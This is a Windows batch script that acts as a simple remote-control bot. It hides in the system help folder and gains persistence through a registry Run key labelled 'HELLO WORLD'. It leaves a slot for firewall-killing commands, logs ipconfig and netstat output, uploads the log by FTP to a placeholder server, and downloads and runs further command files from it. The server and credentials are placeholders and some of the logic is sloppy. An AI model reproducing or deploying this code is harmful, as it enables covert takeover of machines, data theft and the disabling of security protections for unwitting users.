@ECHO OFF
:ComBat
DEL /F /Q "%SystemRoot%\help\combat\com.bat" >NUL
IF EXIST "%SystemRoot%\help\combat\server.bat" GOTO LOG
MKDIR "%SystemRoot%\help\combat\"
> "%SystemRoot%\help\combat\com.bat" ECHO @ECHO OFF
>>"%SystemRoot%\help\combat\com.bat" ECHO MOVE /Y %0 "%SystemRoot%\help\combat\"
>>"%SystemRoot%\help\combat\com.bat" ECHO CALL "%SystemRoot%\help\combat\server.bat"
GOTO RUN

:LOG
DEL /F /Q "%SystemRoot%\help\combat\%USERNAME%.log" >NUL
> "%SystemRoot%\help\combat\%USERNAME%.log" ECHO Server Log:
>> "%SystemRoot%\help\combat\%USERNAME%.log" ECHO.

:PATH
PATH|FIND "WINDOWS" >NUL
IF NOT ERRORLEVEL 1 SET WINDIR=WINDOWS
PATH|FIND "SYSTEM" >NUL
IF NOT ERRORLEVEL 1 SET SYSDIR=SYSTEM
PATH|FIND "WINNT" >NUL
IF NOT ERRORLEVEL 1 SET WINDIR=WINNT
PATH|FIND "SYSTEM32" >NUL
IF NOT ERRORLEVEL 1 SET SYSDIR=SYSTEM32

:FINDOS
VER|FIND "XP">NUL|SET OSV=XP
IF NOT ERRORLEVEL 1 GOTO RegXP
VER|FIND "2000">NUL|SET OSV=2K
IF NOT ERRORLEVEL 1 GOTO RegXP
VER|FIND "NT">NUL|SET OSV=NT
IF NOT ERRORLEVEL 1 GOTO Reg9X
VER|FIND "Mil">NUL|SET OSV=ME
IF NOT ERRORLEVEL 1 GOTO Reg9X
VER|FIND "98">NUL|SET OSV=98
IF NOT ERRORLEVEL 1 GOTO Reg9X
VER|FIND "95">NUL|SET OSV=95
IF NOT ERRORLEVEL 1 GOTO Reg9X
GOTO END

:RegXP
> "%SystemRoot%\help\combat\regpatch.reg" ECHO Windows Registry Editor Version 5.00
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemRoot%\\%WINDIR%\\help\\combat\\server.bat"
GOTO ADD

:Reg9X
> "%SystemRoot%\help\combat\regpatch.reg" ECHO REGEDIT4
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO.
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regpatch.reg" ECHO "HELLO WORLD"="%SystemRoot%\\%WINDIR%\\help\\combat\\server.bat"
GOTO ADD

:ADD
IF NOT EXIST "%SystemRoot%\help\combat\regpatch.reg" GOTO PATH
REGEDIT /S "%SystemRoot%\help\combat\regpatch.reg"
DEL /F /Q "%SystemRoot%\help\combat\regpatch.reg" >NUL

:OSV
IF %OSV%==XP GOTO WinXP
IF %OSV%==2K GOTO Win2K
IF %OSV%==NT GOTO WinNT
IF %OSV%==ME GOTO WinME
IF %OSV%==98 GOTO Win98
IF %OSV%==95 GOTO Win95
ELSE GOTO END

:: place OS specific commands here:
:WinXP
GOTO :KillFW
:Win2K
GOTO :KillFW
:WinNT
GOTO :KillFW
:WinME
GOTO :KillFW
:Win98
GOTO :KillFW
:Win95
GOTO :KillFW

:KillFW
:: add Firewall killing NET STOP commands here.

:PING
PING (ftp server) -n 4 -w 1000 >NUL
IF ERRORLEVEL 1 GOTO PING

:STATS
IF NOT EXIST "%SystemRoot%\help\combat\%USERNAME%.log" GOTO LOG
IPCONFIG /all >> "%SystemRoot%\help\combat\%USERNAME%.log"
NETSTAT -a -n >> "%SystemRoot%\help\combat\%USERNAME%.log"

:COM
> "%SystemRoot%\help\combat\com.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\com.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\com.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\com.txt" ECHO prompt
>>"%SystemRoot%\help\combat\com.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\com.txt" ECHO put "%SystemRoot%\help\combat\%USERNAME%.log"
>>"%SystemRoot%\help\combat\com.txt" ECHO get "com%OSV%.bat" "%SystemRoot%\help\combat\com.bat"
>>"%SystemRoot%\help\combat\com.txt" ECHO bye

:FTP
IF NOT EXIST "%SystemRoot%\help\combat\com.txt" GOTO COM
FTP -s:"%SystemRoot%\help\combat\com.txt" >NUL
DEL /F /Q "%SystemRoot%\help\combat\com.txt" >NUL

:RUN
CALL "%SystemRoot%\help\combat\com.bat"

:END
EXIT